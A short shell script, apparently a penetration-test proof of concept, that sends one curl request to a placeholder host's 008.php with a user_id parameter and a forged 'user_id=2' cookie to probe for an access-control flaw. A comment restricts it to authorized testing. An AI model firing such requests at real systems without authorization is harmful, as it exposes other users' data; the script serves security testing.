#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X GET 'http://TARGET:8080/008.php?action=view&user_id=<id>' \
  -H 'Cookie: user_id=2'
